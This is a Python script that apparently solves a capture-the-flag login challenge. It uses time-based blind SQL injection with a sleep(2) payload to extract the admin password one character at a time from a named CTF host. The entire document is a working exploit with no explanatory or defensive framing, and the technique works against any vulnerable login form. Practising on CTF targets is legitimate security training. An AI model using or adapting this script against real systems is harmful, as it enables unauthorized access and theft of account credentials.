import string
import requests
from time import time
from tqdm import tqdm

sess= requests.session()
 
URL= 'http://ctf-hackingcamp.com:7001/loginme/?id=&pw='
pw = ""
times = {}

for i in tqdm(range (1,16)):
    for x in string.printable:
        start = time()
        query = "' || id='admin' and ascii(substr(pw,"+str(i)+",1))="+str(ord(x))+" and sleep(2) %23"
        res = sess.get(url = URL+query)
        end = time()
        times[x] = end - start
    k = max(times, key=lambda x: times[x])
    pw += k
    print("Found Key :", k)

print("pw :", pw)